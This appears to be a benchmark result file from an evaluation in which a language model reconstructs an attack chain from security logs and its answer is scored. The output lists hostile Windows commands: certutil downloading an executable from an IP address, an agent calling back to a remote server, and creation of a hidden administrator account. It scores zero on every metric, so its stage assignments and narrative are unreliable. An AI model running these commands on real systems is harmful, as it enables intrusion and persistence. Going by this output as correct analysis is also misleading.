@@ -1,0 +1,79 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c start /min C:\\Users\\Public\\agent.exe ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "net user nbb nb123. /add & net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd /c certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "ywm.exe",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attack began with an initial access via a potentially malicious URL accessed through Chrome. The attacker then utilized a tool like certutil to download another payload to the machine. This payload executed as part of a lateral movement operation by spawning an agent.exe instance that communicated back to the attacker\u2019s server. To establish persistence, the agent was run under privileged admin rights. Later steps involved privilege escalation using built-in commands to add users to administrative groups. Finally, another executable was downloaded and executed to further maintain control over the system.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 10783,
+      "completion_tokens": 373,
+      "total_tokens": 11156,
+      "wall_clock_s": 4.79,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 7,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 7,
+      "fn": 6,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 10783,
+      "completion_tokens": 373,
+      "total_tokens": 11156,
+      "wall_clock_s": 4.79,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
